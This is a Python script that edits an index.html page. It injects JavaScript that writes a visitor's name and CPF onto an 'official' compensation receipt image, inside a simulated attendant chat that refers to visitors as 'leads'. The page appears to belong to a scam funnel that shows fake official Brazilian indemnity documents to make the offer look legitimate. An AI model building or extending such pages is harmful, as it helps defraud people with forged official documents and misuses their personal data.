import re

with open("scratch/template_b64.txt", "r") as f:
    b64_template = f.read().strip()

with open("index.html", "r", encoding="utf-8") as f:
    text = f.read()

# 1. Update comprovante row in requestComprovante()
old_comp_pattern = re.compile(
    r"showTyping\(2200,\s*function\s*\(\)\s*\{\s*//\s*Imagem do Comprovante Gerado Oficial[\s\S]*?addCustomElement\(compImgRow\);",
    re.MULTILINE
)

new_comp_code = """showTyping(2200, function () {
                // Imagem do Comprovante Gerado Oficial com Dados Dinamicos (Nome e CPF)
                var compImgRow = document.createElement("div");
                compImgRow.className = "attendant-row anim-fade";
                var uniqueCompId = "compImg_" + Math.floor(Math.random() * 100000);
                compImgRow.innerHTML =
                  ATTENDANT_AVATAR_HTML +
                  '<div class="comprovante-img-wrapper">' +
                  '<img id="' + uniqueCompId + '" src="images/comprovante_clean_template.png" alt="Comprovante de Indenizacao Oficial">' +
                  "</div>";
                addCustomElement(compImgRow);

                setTimeout(function () {
                  var imgTarget = document.getElementById(uniqueCompId);
                  if (imgTarget) {
                    renderDynamicComprovante(imgTarget);
                  }
                }, 50);"""

assert old_comp_pattern.search(text) is not None, "old_comp_pattern not found!"
text = old_comp_pattern.sub(new_comp_code, text, count=1)

# 2. Add renderDynamicComprovante function
audio_def_idx = text.find("function createAudioPlayerRow(audioSrc, durationStr) {")
assert audio_def_idx != -1, "createAudioPlayerRow not found!"

render_func_code = """/* Renderizador do Comprovante Dinamico com Nome e CPF */
        var __COMPROVANTE_TEMPLATE_B64 = "data:image/png;base64," + """ + repr(b64_template) + """;

        function renderDynamicComprovante(targetImgEl) {
          if (!targetImgEl) return;
          var nome = (typeof leadData !== "undefined" && leadData && leadData.nome) || localStorage.getItem("nome") || "Nome do Cidadao";
          var cpf = (typeof leadData !== "undefined" && leadData && leadData.cpf) || localStorage.getItem("cpf") || "";
          
          var tpl = new Image();
          tpl.onload = function () {
            try {
              var cv = document.createElement("canvas");
              cv.width = tpl.width || 864;
              cv.height = tpl.height || 800;
              var ctx = cv.getContext("2d");
              ctx.drawImage(tpl, 0, 0);

              // 1. Escreve o Nome Completo na caixa superior
              ctx.fillStyle = "#0f172a";
              ctx.font = "bold 31px Arial, sans-serif";
              ctx.textBaseline = "top";
              ctx.fillText(formatName(nome), 50, 198);

              // 2. Escreve o CPF no campo Numero do Documento
              if (cpf) {
                ctx.font = "bold 21px Arial, sans-serif";
                ctx.fillText(formatCpf(cpf), 456, 277);
              }

              targetImgEl.src = cv.toDataURL("image/png");
            } catch (err) {
              console.warn("Erro ao renderizar canvas do comprovante:", err);
            }
          };
          tpl.onerror = function () {
            tpl.src = __COMPROVANTE_TEMPLATE_B64;
          };
          tpl.src = "images/comprovante_clean_template.png";
        }

        """

text = text[:audio_def_idx] + render_func_code + text[audio_def_idx:]

with open("index.html", "w", encoding="utf-8") as f:
    f.write(text)

print("Successfully injected dynamic comprovante in index.html!")
